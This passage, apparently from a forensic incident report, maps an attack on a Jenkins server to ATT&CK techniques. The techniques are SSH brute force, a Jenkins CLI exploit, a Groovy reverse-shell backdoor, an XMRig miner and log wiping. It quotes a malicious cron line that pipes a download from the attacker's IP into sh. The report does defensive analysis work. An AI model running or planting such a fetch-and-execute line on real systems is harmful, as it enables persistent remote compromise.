` `/disk/var/lib/jenkins/.ssh/authorized_keys:2` ``).\n\n## Attack Chain & ATT&CK Technique Mapping\n\n| Stage | ATT&CK Technique | On-Disk / SAS Artifact | In SAS Alerts? | Details & Citation |\n|---|---|---|---|---|\n| Reconnaissance / Brute Force | **T1110 (Brute Force)** / **T1078 (Valid Accounts)** | `/disk/var/log/auth.log.1.gz:89` | **NO (Silent)** | Attacker at `198.51.100.98` performed SSH password brute force against `root`, `admin`, `postgres`, `oracle`, `test`, succeeding as `root` on 2026-08-19 00:55:24 UTC (`` `/disk/var/log/auth.log.1.gz:89` `` and `` `/disk/var/log/auth.log:131` ``). |\n| Initial Access | **T1190 (Exploit Public-Facing Application)** | `/disk/var/lib/jenkins/jobs/.tmp/config.xml:1` | **YES** | Exploited Jenkins CLI arbitrary file read / RCE vulnerability (CVE-2024-23897). Deserialization gadget stored at `/var/lib/jenkins/jobs/.tmp/config.xml` (`` `/disk/var/lib/jenkins/jobs/.tmp/config.xml:1` ``, `` `/sas/alerts.json` `` ALERT-01). |\n| Execution | **T1059.004 (Unix Shell)** | `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` | **NO (Silent)** | Groovy shell script execution spawning threads for reverse connection (`` `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` ``). |\n| Impact | **T1496 (Resource Hijacking)** | `/disk/opt/jenkins/.xmr/xmrig:1` | **YES** | XMRig cryptominer binary executed (pid 1337) consuming high CPU cycles to mine Monero (`` `/disk/opt/jenkins/.xmr/xmrig:1` ``, `` `/sas/alerts.json` `` ALERT-02). |\n| Persistence (Cron) | **T1053.003 (Cron)** | `/disk/var/spool/cron/crontabs/jenkins:4` | **YES** | User crontab entry running `curl hxxp://198.51.100.98/x | sh` every minute to maintain miner execution and payload re-drops (`` `/disk/var/spool/cron/crontabs/jenkins:4` ``, `` `/sas/alerts.json` `` ALERT-03). |\n| Persistence (Groovy Init Hook) | **T1037.004 (RC Scripts / Init Scripts)** | `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` | **NO (Silent)** | Malicious Groovy script `z-backdoor.groovy` planted in Jenkins init script directory establishing automated reverse shell to `198.51.100.98` upon Jenkins controller start (`` `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` ``). |\n| Persistence (SSH Key Backdoor) | **T1098.004 (SSH Authorized Keys)** | `/disk/var/lib/jenkins/.ssh/authorized_keys:2` | **NO (Silent)** | Attacker public SSH key appended to `/var/lib/jenkins/.ssh/authorized_keys` enabling persistent backdoor SSH access to the `jenkins` user account (`` `/disk/var/lib/jenkins/.ssh/authorized_keys:2` ``). |\n| Defense Evasion | **T1070.002 (Clear Linux System Logs)** | `/disk/var/lib/.cache/.wiped.bin:1` | **NO (Silent)** | Jenkins system logs truncated/wiped to destroy forensic evidence of CLI exploit execution (`` `/disk/var/lib/.cache/.wiped.bin:1` ``). |\n| Secondary Probes | **T1595 (Active Scanning)** | `/disk/var/log/nginx/access.log:370` | **NO (Silent)** | Attacker probed web server endpoints for webshell upload `/uploads/shell.php`, Log4Shell, and Struts vectors (`` `/disk/var/log/nginx/access.log:370` ``). |\n\n## Benign Operational Artifacts (Disambiguation)\nDuring the investigation, the following artifacts were reviewed and verified as legitimate operations:\n- `/var/lib/jenkins/init.groovy.d/logging.groovy`: Legitimate scheduled maintenance and remote backup job (`backup.sh --remote 10.10.71`) (`` `/disk/var/lib/jenkins/init.groovy.d/logging.groovy:2` ``). Note: SAS change ticket referenced this as an approved change (`` `/sas/handoff/change-ticket.md` ``).\n- `/etc/crontab`: Standard system crontab running backup at 03:00 UTC (`` `/disk/etc/crontab:2` ``).\n\n## Assessment of Overall Impact\n1. **Compute Resources**: High CPU saturation due to active XMRig mining process (pid 1337) (`` `/disk/opt/jenkins/.xmr/xmrig:3` ``).\n2. **System Integrity & Control**: Complete administrative control gained by attacker over the `jenkins` service user and system `root` account (`` `/disk/var/log/auth.log.1.gz:89` ``).\n3.